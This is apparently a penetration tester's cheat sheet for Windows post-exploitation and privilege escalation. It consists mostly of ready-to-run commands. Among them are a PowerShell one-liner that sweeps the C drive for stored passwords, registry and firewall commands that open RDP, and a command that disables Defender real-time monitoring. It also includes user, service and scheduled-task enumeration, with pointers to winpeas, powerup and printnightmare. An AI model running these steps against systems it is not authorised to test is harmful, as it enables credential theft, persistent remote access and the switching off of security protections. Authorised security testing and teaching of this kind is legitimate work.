### User Enumeration:
```
whoami /all
systeminfo

net users (list users)
net user <username> (provides additional information about specific user)
net localgroup (user groups defined on the system)
net localgroup administrators (see which users are a part of this group)

qwinsta (checks if other users logged in simultanously)
```
### Recursively/recurse look for keywords:
put quotes around all usernames:
```
paste -sd, userlist2.txt | sed 's/[^,]*/"&"/g'
```

Recursively check entire file system for anything related to any of the user or common credential patterns(append users at the end):
Less thorough version(append users at the end):
```powershell
Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass="
```

Quickly restarts machine. This can be quite useful for startup processes to trigger:
```
shutdown /r /t 0
```
### Firewall
<https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#firewall>
Open RDP:
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
```
### System Information
systeminfo
hostname (might give you a clue as to what this machine's role is in the enterprise)
### Searching ### Files
```
(findstr searches for patterns of text in files. `/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i))
findstr /si password *.txt  
(powershell, looks across entire c drive to find all filenames that matches specified string)
get-childitem c:\ -recurse -erroraction silentlycontinue | where-object {$_.Name -match "Veeam.one"} 
(gives lot of info about file, including exact version)
get-childitem "C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Deployment.Service.exe" | format-list *  
```
### Patch Level

wmic qfe get Caption,Description,HotFixID,InstalledOn (This command can be used to list updates installed on the target system.)
### Network Connections
enumerate ports and process-ids

```
netstat -ano | findstr /vi UDP
powershell.exe -c "(Get-WmiObject Win32_Process -Filter 'ProcessId = 5616').GetOwner()"
powershell.exe -c "(Get-WmiObject Win32_Process -Filter 'ProcessId = 5616')"
```
### Scheduled Tasks

```
schtasks
schtasks /query /fo LIST /v (The schtasks command can be used to query scheduled tasks.)
schtasks | findstr /si soon 
schtasks /delete /tn soon /F
```

### Drivers
driverquery (will list drivers installed on the target system.)
### Antivirus
sc query windefend (simple check if defender is present and it's status)
wmic service get name,displayname,pathname,startmode | findstr "Defender"

Disable anti virus real time detection: (needs administrator session)
```
powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true
```
### Services
```
wmic service get name,pathname,startmode,state | findstr /i 'c:' | findstr /i /v "C:\\windows\\"
wmic service get name,pathname,startmode,state | findstr /i "auto" | findstr /i /v "C:\\windows\\"
powershell -c "Get-CimInstance -ClassName win32_service | Select Name,State,PathName"
powershell -c "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | findstr /i windefend" 
services
```

run powerup
run winpeas
run windows-exploit-suggester
```
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State"
```

Manually start checking service and file permissions with accesschk
Check for hidden files
check for silly creds hidden somewhere. check with the powershell oneliner first
Try printnightmare